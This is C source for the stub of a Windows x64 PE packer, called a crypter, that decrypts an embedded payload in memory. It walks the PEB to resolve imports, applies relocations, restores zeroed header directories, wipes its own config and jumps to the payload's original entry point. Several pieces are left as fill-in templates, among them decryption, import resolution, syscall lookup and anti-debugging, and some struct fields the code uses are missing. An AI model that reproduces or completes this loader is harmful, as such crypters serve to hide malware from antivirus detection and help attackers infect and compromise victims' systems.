/*
*
*   __  _  ____ __  __ __ __  ____  ____ _____ __  _______  _____  ____ _____ 
*  |  \| || ===|\ \/ /|  |  |(_ (_`/ (__`| () )\ \/ /| ()_)|_   _|| ===|| () )
*  |_|\__||____|/_/\_\ \___/.__)__)\____)|_|\_\ |__| |_|     |_|  |____||_|\_\ v8
*   x64 pe packer - signal: vertigo.66
*
*   License: CC-BY-NC-SA 4.0
*    
*   Features:
*   * BYOS (bring your own stub)
*   * stub template available
*   * extensive debug output (-DDEBUG & --debug flags)
*   * randomized config marker
*   * zeroed out optional headers
*   * secure key generation
*   * checksum recalculation
*   * pe section manipulation
*
*   Compile:
*   .\gcc.exe stub.c -o stub.o [-DDEBUG] -fno-asynchronous-unwind-tables -fno-ident -fno-stack-protector
*   .\ld.exe stub.o -o stub.exe -nostdlib --build-id=none -s --entry=_start
*   .\objcopy.exe -O binary stub.exe stub.bin
*   .\windres.exe resource.rc -o resource.o 
*   .\gcc.exe nexus-crypter.c resource.o -o nexus-crypter.exe -lbcrypt
*
*/

#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <intrin.h>

#define IMAGE_REL_BASED_ABSOLUTE 0
#define IMAGE_REL_BASED_DIR64    10

#pragma pack(push, 1)
typedef struct {
    uint64_t key;
    // your config struct here...
    
} STUB_CONFIG;
#pragma pack(pop)

typedef void* (WINAPI *fn_VirtualAlloc)(void*, size_t, DWORD, DWORD);
// your typedefs here...

typedef struct _STUB_RUNTIME {
    fn_VirtualAlloc pVirtualAlloc;
    // your imports here...
    
} STUB_RUNTIME;

// so we can use them above the actual function
void debug_print(STUB_RUNTIME* rt, const char* msg);
void debug_print_hex(STUB_RUNTIME* rt, const char* name, uint64_t value);
void debug_print_dec(STUB_RUNTIME* rt, const char* name, uint64_t value);

void resolve_imports(STUB_RUNTIME* rt, uint8_t ultra) {
    void* k32 = NULL;
    void* peb = (void*)__readgsqword(0x60);
    
    // your import resolution here...
}

uint32_t get_syscall_num(void* func) {
    // your syscall retrieval here...
}

int anti_anti_anti_debug(STUB_RUNTIME* rt) {
    void* ntdll = rt->pLoadLibraryA("ntdll.dll");
    uint8_t* func = (uint8_t*)rt->pGetProcAddress(ntdll, "NtQueryInformationProcess");
    uint32_t num = get_syscall_num(func);
    if (num == 0) return 1; 
    
    // your syscall here...
}

// imports for payload using STUB RUNTIME struct imports from PEB walking
void resolve_payload_imports(uint8_t* target_base, STUB_CONFIG* config, STUB_RUNTIME* rt) {
    if (!config->import_rva || !rt->pLoadLibraryA || !rt->pGetProcAddress) {
	    return;
    }
    uint8_t* base = target_base;
    IMAGE_IMPORT_DESCRIPTOR* iid = (IMAGE_IMPORT_DESCRIPTOR*)(base + config->import_rva);
    while (iid->Name) {
        char* dll_name = (char*)(base + iid->Name);
        HMODULE hMod = rt->pLoadLibraryA(dll_name);
        if (!hMod) {
            iid++;
            continue;
        }
        uint64_t* thunk = (uint64_t*)(base + iid->FirstThunk);
        uint64_t* orig_thunk = iid->OriginalFirstThunk ? (uint64_t*)(base + iid->OriginalFirstThunk) : thunk;
        while (*orig_thunk) {
            FARPROC proc = NULL;
            if (*orig_thunk & 0x8000000000000000ULL) {
                proc = rt->pGetProcAddress(hMod, (LPCSTR)(*orig_thunk & 0xFFFF));
            } else {
                IMAGE_IMPORT_BY_NAME* name_rec = (IMAGE_IMPORT_BY_NAME*)(base + *orig_thunk);
                proc = rt->pGetProcAddress(hMod, name_rec->Name);
            }
            if (proc) *thunk = (uint64_t)proc;
            thunk++;
            orig_thunk++;
        }
        iid++;
    }
}

void apply_relocations(STUB_RUNTIME* rt, uint8_t* current_base, uint8_t* original_image_base, IMAGE_DATA_DIRECTORY* reloc_dir, size_t image_size) {
    if (reloc_dir->VirtualAddress == 0 || reloc_dir->Size == 0) {
        return;
    }
    int64_t delta = (int64_t)current_base - (int64_t)original_image_base;
    #ifdef DEBUG 
        debug_print_hex(rt, "Reloc Delta", delta); 
    #endif
    if (delta == 0) {
        return;
    }
    IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(current_base + reloc_dir->VirtualAddress);
    IMAGE_BASE_RELOCATION* reloc_end = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc_dir->Size);
    while (reloc->VirtualAddress != 0 && reloc->SizeOfBlock != 0) {
        if (reloc->VirtualAddress >= image_size) break; 
        uint8_t* page_rva = current_base + reloc->VirtualAddress;
        uint32_t num_entries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t);
        uint16_t* entry = (uint16_t*)((uint8_t*)reloc + sizeof(IMAGE_BASE_RELOCATION));
        #ifdef DEBUG
            int relocs_processed = 0;
        #endif
        for (uint32_t i = 0; i < num_entries; i++) {
            uint16_t type = entry[i] >> 12;      
            uint16_t offset = entry[i] & 0x0FFF; 

            if (type == IMAGE_REL_BASED_DIR64) {
                if (reloc->VirtualAddress + offset + 8 > image_size) continue;
                uint64_t* target_ptr = (uint64_t*)(page_rva + offset);
                *target_ptr += delta;
                #ifdef DEBUG
                    relocs_processed += 1;
                #endif
            } 
        }
        #ifdef DEBUG
            debug_print_dec(rt, "Number of relocs processed", relocs_processed);
        #endif
        reloc = (IMAGE_BASE_RELOCATION*)((uint8_t*)reloc + reloc->SizeOfBlock);
    }
}


void manual_relocations(uint8_t* base, uint8_t* preferred_base, size_t image_size) {
    int64_t delta = (int64_t)base - (int64_t)preferred_base;
    if (delta == 0) return;
    
    // your manual relocs here...
    // fixes some broken exes
}

// avoid rwx memory protections!
void apply_section_permissions(STUB_RUNTIME* rt, uint8_t* base, IMAGE_NT_HEADERS* nt, IMAGE_SECTION_HEADER* sec) {
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        uint8_t* addr = base + sec[i].VirtualAddress;
        size_t size = sec[i].Misc.VirtualSize ? sec[i].Misc.VirtualSize : sec[i].SizeOfRawData;
        if (size == 0) continue;
        DWORD prot = PAGE_READONLY;
        DWORD chars = sec[i].Characteristics;
        if (chars & IMAGE_SCN_MEM_EXECUTE) {
            prot = (chars & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
        } else if (chars & IMAGE_SCN_MEM_WRITE) {
            prot = PAGE_READWRITE;
        } else if (chars & IMAGE_SCN_MEM_READ) {
            prot = PAGE_READONLY;
        } else {
            prot = PAGE_NOACCESS;
        }
        DWORD old;
        rt->pVirtualProtect(addr, size, prot, &old);
    }
}

// restore directories the packer zeroed
void restore_directories_and_relocate(STUB_RUNTIME* rt, STUB_CONFIG* config, IMAGE_NT_HEADERS* nt, uint8_t* target_base) {
    if (config->resource_rva != 0 || config->exception_rva != 0 || config->tls_rva != 0 || config->reloc_rva != 0) {
        DWORD old_header_prot;
        // set headers to writable
        rt->pVirtualProtect(target_base, 0x1000, PAGE_READWRITE, &old_header_prot);
        #ifdef DEBUG
            debug_print(rt, "Made headers writable");
        #endif
        if (config->resource_rva != 0) {
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = config->resource_rva;
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = config->resource_size;
            #ifdef DEBUG
                debug_print(rt, "Restored resource directory");
            #endif
        } 
        if (config->exception_rva != 0) {
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress = config->exception_rva;
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size = config->exception_size;
            #ifdef DEBUG
                debug_print(rt, "Restored exception directory");
            #endif
        }
        if (config->tls_rva != 0) {
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress = config->tls_rva;
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size = config->tls_size;
            #ifdef DEBUG
                debug_print(rt, "Restored TLS directory");
            #endif
        }
        if (config->reloc_rva != 0) {
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = config->reloc_rva;
            nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = config->reloc_size;
            #ifdef DEBUG
                debug_print(rt, "Restored reloc directory");
            #endif
            #ifdef DEBUG
                debug_print(rt, "Applying relocations");
            #endif
            // scan reloc directory
            apply_relocations(rt, target_base, (uint8_t*)(uintptr_t)config->image_base, &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC], nt->OptionalHeader.SizeOfImage);
            #ifdef DEBUG
                debug_print(rt, "Relocations applied");
            #endif
            // catch anything the reloc directory missed
            manual_relocations(target_base, (uint8_t*)(uintptr_t)config->image_base, nt->OptionalHeader.SizeOfImage);
            #ifdef DEBUG
                debug_print(rt, "Additional relocations applied");
            #endif
        }
        // set headers back to their original protection (probs read-only)
        rt->pVirtualProtect(target_base, 0x1000, old_header_prot, &old_header_prot);
        #ifdef DEBUG
            debug_print(rt, "Restored headers to read-only");
        #endif
    }
}

typedef void(WINAPI *TLS_CALLBACK)(PVOID, DWORD, PVOID);

void tls_callbacks(uint8_t* base, uint32_t tls_rva, STUB_RUNTIME* rt) {
    if (!tls_rva) return;
    IMAGE_TLS_DIRECTORY64* tls = (IMAGE_TLS_DIRECTORY64*)(base + tls_rva);
    if (tls->AddressOfCallBacks == 0 || tls->StartAddressOfRawData == 0 || tls->EndAddressOfRawData == 0 || tls->SizeOfZeroFill == 0) {
        return;
    }
    // your tls callbacks here...
}

void* memcpy(void* dest, const void* src, size_t n) {
    uint8_t* d = (uint8_t*)dest;
    const uint8_t* s = (const uint8_t*)src;
    while (n--) *d++ = *s++;
    return dest;
}

void SecureWipe(unsigned char* ptr, size_t len) {
    volatile unsigned char* p = ptr;
    while (len--) {
        *p++ = 0;
    }
}

void debug_print(STUB_RUNTIME* rt, const char* msg) {
    if (rt->pOutputDebugStringA) {
        rt->pOutputDebugStringA(msg); // import from kernel32
    }
}

void debug_print_hex(STUB_RUNTIME* rt, const char* name, uint64_t value) {
    char buffer[128];
    char* p = buffer;
    while (*name) *p++ = *name++;
    *p++ = ':';
    *p++ = ' ';
    *p++ = '0';
    *p++ = 'x';
    char hex[] = "0123456789ABCDEF";
    int started = 0;
    for (int i = 60; i >= 0; i -= 4) {
        int digit = (int)((value >> i) & 0xF);
        if (digit != 0) started = 1;
        if (started || i == 0) {
            *p++ = hex[digit];
        }
    }
    *p = 0;
    debug_print(rt, buffer);
}

void debug_print_dec(STUB_RUNTIME* rt, const char* name, uint64_t value) {
    char buffer[128];
    char* p = buffer;
    while (*name) *p++ = *name++;
    *p++ = ':';
    *p++ = ' ';
    if (value == 0) {
        *p++ = '0';
    } else {
        char numbuf[21];
        char* np = numbuf + 20;
        *np = 0;
        while (value > 0) {
            *--np = '0' + (value % 10);
            value /= 10;
        }
        while (*np) *p++ = *np++;
    }
    *p = 0;
    debug_print(rt, buffer);
}

void decrypt_data(uint8_t* data, size_t size, uint64_t key) {
    // your decryption here...
}

__attribute__((noinline))
void stub_main(STUB_CONFIG* config) {
    STUB_RUNTIME rt;
    resolve_imports(&rt, config->ultra);

    #ifdef DEBUG // not included in non -DDEBUG compilations
        debug_print(&rt, "Stub main starting");
        debug_print_hex(&rt, "Decryption key", config->key);
        debug_print_dec(&rt, "Original OEP", config->original_oep);
        debug_print_dec(&rt, "Encrypted size", config->encrypted_size);
        debug_print_dec(&rt, "Image base", config->image_base);
        debug_print_dec(&rt, "Sections RVA", config->sections_rva);
    #endif

    // allocate decryption buffer - avoid rwx
    void* buffer = rt.pVirtualAlloc(NULL, config->encrypted_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        #ifdef DEBUG
            debug_print(&rt, "VirtualAlloc failed");
        #endif
        return;
    }
    #ifdef DEBUG
        debug_print_hex(&rt, "Allocated buffer", (uint64_t)buffer);
    #endif

	// read peb to determine actual base
    void* peb = (void*)__readgsqword(0x60);
    uint8_t* actual_base = *(uint8_t**)((uint8_t*)peb + 0x10);

    uint8_t* encrypted = actual_base + config->sections_rva;
    uint8_t* decrypted = (uint8_t*)buffer;
	// copy encrypted payload into the buffer
    memcpy(decrypted, encrypted, config->encrypted_size);
    #ifdef DEBUG
        debug_print(&rt, "Starting decryption");
    #endif
    // decrypt...
    decrypt_data(decrypted, config->encrypted_size, config->key);
    #ifdef DEBUG
        debug_print(&rt, "Decryption complete");
    #endif

    uint8_t* target_base = actual_base;
    uint8_t* target_sections = actual_base + config->sections_rva;
    DWORD old_protect;

	// set mem protection on payload memory space
    rt.pVirtualProtect(target_sections, config->encrypted_size, PAGE_READWRITE, &old_protect);
    #ifdef DEBUG
        debug_print(&rt, "Set target memory space to RW");
    #endif
    // copy back to process memory from buffer
    memcpy(target_sections, decrypted, config->encrypted_size);
    #ifdef DEBUG
        debug_print(&rt, "Copied decrypted data to target location");
    #endif

    // overwrite buffer with zero
    SecureWipe((unsigned char*)buffer, config->encrypted_size);
    #ifdef DEBUG
        debug_print(&rt, "Overwrote temporary buffer with zeros");
    #endif
	// release buffer back to the os
    rt.pVirtualFree(buffer, 0, MEM_RELEASE);
    #ifdef DEBUG
        debug_print(&rt, "Released temporary buffer");
    #endif

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)target_base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(target_base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    // fill in bss and extra sections
    for (uint16_t i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData == 0 && sec[i].Misc.VirtualSize > 0) {
            uint8_t* bss = target_base + sec[i].VirtualAddress;
            #ifdef DEBUG
                debug_print(&rt, "Zeroing BSS section");
            #endif
            SecureWipe(bss, sec[i].Misc.VirtualSize);
        } else if (sec[i].SizeOfRawData > 0 && sec[i].Misc.VirtualSize > sec[i].SizeOfRawData) {
            uint32_t extra_offset = sec[i].VirtualAddress + sec[i].SizeOfRawData;
            uint32_t extra_size = sec[i].Misc.VirtualSize - sec[i].SizeOfRawData;
            uint8_t* extra = target_base + extra_offset;
            #ifdef DEBUG
                debug_print(&rt, "Zeroing extra section data");
            #endif
            SecureWipe(extra, extra_size);
        }
    }

    restore_directories_and_relocate(&rt, config, nt, target_base);

    #ifdef DEBUG
        debug_print(&rt, "Resolving payload imports");
    #endif
    // use payloads decrypted iat and saved imports from the config struct
    resolve_payload_imports(target_base, config, &rt);
    #ifdef DEBUG
        debug_print(&rt, "Payload imports resolved");
    #endif

    if (config->tls_rva != 0) {
        tls_callbacks(target_base, config->tls_rva, &rt);
    }

    // loop through each section, applying proper protections
    apply_section_permissions(&rt, target_base, nt, sec);
    #ifdef DEBUG
        debug_print(&rt, "Set payload memory space protections");
    #endif

    // save address of original entry point before wiping config
    void (*original_entry)() = (void(*)())(target_base + config->original_oep);

    DWORD old_stub_prot;
    rt.pVirtualProtect(config, sizeof(STUB_CONFIG) + 4, PAGE_READWRITE, &old_stub_prot);
    // wipe config
    SecureWipe((unsigned char*)config, sizeof(STUB_CONFIG) + 4);
    rt.pVirtualProtect(config, sizeof(STUB_CONFIG) + 4, old_stub_prot, &old_stub_prot);
    #ifdef DEBUG
        debug_print(&rt, "Wiped payload config");
    #endif

    #ifdef DEBUG
        debug_print_hex(&rt, "Jumping to original entry point", (uint64_t)original_entry);
    #endif
    // jump to oep
    original_entry();
}

static volatile uint32_t MARKER_VALUE = 0xDEADBEEF; // to be patched by packer

__attribute__((noinline))
void position_independent_entry(void) {
    void* return_addr = __builtin_return_address(0); // using _start() as a reference
    uint8_t* current_ip = (uint8_t*)return_addr;
    uint8_t* marker_location = current_ip;
    
    // search for your config here...

    STUB_CONFIG* config = (STUB_CONFIG*)(marker_location - sizeof(STUB_CONFIG));
    stub_main(config); // pass found config to main function
}

__attribute__((naked)) int _start() {
    __asm__ volatile ( 
        ".intel_syntax noprefix\n"
        ".byte 0x42, 0x59, 0x4F, 0x53\n" // entry marker
        "and rsp, 0xFFFFFFFFFFFFFFF0\n"  // align the stack
        "sub rsp, 0x20\n"                // allocate shadow space
        "call position_independent_entry\n"  
        "add rsp, 0x20\n"
        "ret\n"
        ".att_syntax prefix\n"
    );
}

int main() { return 0; }
